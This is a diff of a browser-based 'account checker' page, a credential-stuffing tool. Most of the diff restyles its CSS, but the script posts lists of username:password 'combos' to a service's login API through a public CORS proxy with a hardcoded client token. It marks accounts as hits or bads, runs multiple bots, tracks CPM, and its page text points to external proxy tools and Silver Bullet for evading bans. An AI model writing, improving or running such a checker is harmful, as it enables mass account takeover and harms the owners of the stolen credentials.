@@ -5,88 +5,186 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Advanced Serverless Account Checker</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            margin: 20px; 
-            background-color: #f4f4f4; 
+        :root {
+            --primary-color: #28a745;
+            --primary-hover: #218838;
+            --background-color: #ffffff;
+            --text-color: #333333;
+            --border-color: #dddddd;
+            --error-color: #dc3545;
+            --success-color: #28a745;
+            --warning-color: #ffca2c;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-        select, textarea, input, button { 
-            display: block; 
-            margin: 10px 0; 
-            width: 100%; 
-            padding: 10px; 
-            border-radius: 5px; 
-            border: 1px solid #ccc; 
+
+        /* Dark mode */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --background-color: #1a1a1a;
+                --text-color: #e0e0e0;
+                --border-color: #444444;
+            }
         }
-        textarea { 
-            height: 200px; 
-            resize: vertical; 
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
-        button { 
-            background-color: #28a745; 
-            color: white; 
-            border: none; 
-            cursor: pointer; 
-            font-size: 16px; 
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 20px;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            transition: background-color 0.3s, color 0.3s;
         }
-        button:hover { 
-            background-color: #218838; 
+
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary-color);
         }
-        #results { 
-            white-space: pre-wrap; 
-            background: white; 
-            padding: 15px; 
-            border-radius: 5px; 
-            border: 1px solid #ddd; 
+
+        .note {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            box-shadow: var(--shadow);
+            animation: fadeIn 0.5s ease-in;
         }
-        .hit { 
-            color: green; 
-            font-weight: bold; 
+
+        .note a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
         }
-        .bad { 
-            color: red; 
+
+        .note a:hover {
+            text-decoration: underline;
         }
-        .note { 
-            color: orange; 
-            font-weight: bold; 
-            background: #fff3cd; 
-            padding: 10px; 
-            border-radius: 5px; 
+
+        select, textarea, input, button {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            font-size: 1rem;
+            transition: border-color 0.3s, box-shadow 0.3s;
         }
-        #progress { 
-            width: 100%; 
-            height: 20px; 
-            background: #ddd; 
-            border-radius: 5px; 
-            overflow: hidden; 
+
+        select:focus, textarea:focus, input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 5px rgba(40, 167, 69, 0.3);
         }
-        #progress-bar { 
-            height: 100%; 
-            background: #28a745; 
-            width: 0; 
-            transition: width 0.3s; 
+
+        textarea {
+            height: 200px;
+            resize: vertical;
+            font-family: monospace;
         }
-        #status { 
-            margin-top: 10px; 
-            font-size: 14px; 
+
+        input[type="number"] {
+            max-width: 200px;
         }
-        #stats { 
-            margin-top: 10px; 
-            font-weight: bold; 
+
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 600;
+            padding: 12px;
+            border-radius: 8px;
+            transition: background-color 0.3s, transform 0.2s;
         }
-        a { 
-            color: #007bff; 
-            text-decoration: none; 
+
+        button:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-2px);
         }
-        a:hover { 
-            text-decoration: underline; 
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        #progress {
+            width: 100%;
+            height: 20px;
+            background: var(--border-color);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            box-shadow: var(--shadow);
+        }
+
+        #progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            width: 0;
+            transition: width 0.3s ease;
+        }
+
+        #status, #stats {
+            font-size: 0.9rem;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        #stats {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        #results {
+            background: var(--background-color);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            max-height: 400px;
+            overflow-y: auto;
+            box-shadow: var(--shadow);
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .hit {
+            color: var(--success-color);
+            font-weight: bold;
+        }
+
+        .bad {
+            color: var(--error-color);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Responsive design */
+        @media (max-width: 600px) {
+            h1 { font-size: 1.5rem; }
+            select, textarea, input, button { font-size: 0.9rem; padding: 10px; }
+            .note { font-size: 0.85rem; }
+            #results { font-size: 0.8rem; }
         }
     </style>
 </head>
 <body>
     <h1>Advanced Serverless Account Checker</h1>
-    <p class="note">Important: This is a client-side checker running in your browser. Due to CORS restrictions, we use a public CORS proxy (cors-anywhere.herokuapp.com). Before starting, visit <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">this link</a> and request temporary access. All requests use the proxy's IP, not individual proxies. Proxies are provided for download below and should be used with external tools like Silver Bullet for full proxy support.</p>
-    <p class="note">For configs like Ssport, bans may occur quickly due to shared IP. Download proxies and use external tools for proxy-enabled checking. Features: Multi-bot concurrent checks, progress bar, CPM calculation, hit/bad counters.</p>
+    <p class="note">⚠️ <strong>Important:</strong> This checker runs in your browser and uses a public CORS proxy (cors-anywhere.herokuapp.com). You <strong>must</strong> visit <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">this link</a> and request temporary access before starting, or you’ll get errors like "Unexpected token 'S'". Proxies are managed externally (e.g., via Silver Bullet) as browser-based checks don’t support proxy rotation. Features: Multi-bot checking, progress bar, CPM, hit/bad counters.</p>
+    <p class="note">⚠️ <strong>Note:</strong> Configs like Ssport may ban quickly due to shared IP. Use external tools with proxies for better reliability.</p>
 
     <label for="config">Select Config to Check:</label>
     <select id="config">
@@ -110,11 +208,6 @@
 
     <h2>Results:</h2>
     <div id="results"></div>
-
-    <h2>Download Proxies:</h2>
-    <a href="/proxies/SOCKS5_proxies.txt" download>Download SOCKS5 Proxies</a><br>
-    <a href="/proxies/HTTP_proxies.txt" download>Download HTTP Proxies</a><br>
-    <a href="/proxies/SOCKS4_proxies.txt" download>Download SOCKS4 Proxies</a>
 
     <script>
         const corsProxy = 'https://cors-anywhere.herokuapp.com/';
@@ -158,7 +251,10 @@
                         if (result.includes('HIT')) hits++;
                         else bads++;
                     } catch (error) {
-                        appendResult(`Error on ${combo}: ${error.message}`, 'bad');
+                        let errorMsg = error.message.includes('Unexpected token') 
+                            ? `CORS error: Visit ${corsProxy}corsdemo to request access. (${combo})`
+                            : `Error on ${combo}: ${error.message}`;
+                        appendResult(errorMsg, 'bad');
                         bads++;
                     }
                     checkedCombos++;
@@ -216,9 +312,15 @@
 
         async function fetchWithCors(url, options = {}) {
             try {
-                return await fetch(corsProxy + url, options);
+                return await fetch(corsProxy + url, {
+                    ...options,
+                    headers: {
+                        ...options.headers,
+                        'Origin': window.location.origin
+                    }
+                });
             } catch (error) {
-                throw new Error(`CORS proxy error: ${error.message}. Ensure you have requested access at cors-anywhere.herokuapp.com/corsdemo.`);
+                throw new Error(`CORS proxy error: ${error.message}. Ensure you have requested access at ${corsProxy}corsdemo.`);
             }
         }
 
@@ -257,7 +359,12 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ clientId: 'Web-New', clientToken: '7b12xz9gj608sw2zkaazf6y0ivhw8yqx', password: pass, remember: true, username: user })
             });
-            const loginJson = await loginRes.json();
+            let loginJson;
+            try {
+                loginJson = await loginRes.json();
+            } catch (error) {
+                throw new Error(`JSON parse error: ${error.message}. Likely CORS access issue.`);
+            }
             if (!loginJson.success) {
                 return `BAD: ${user}:${pass}`;
             }
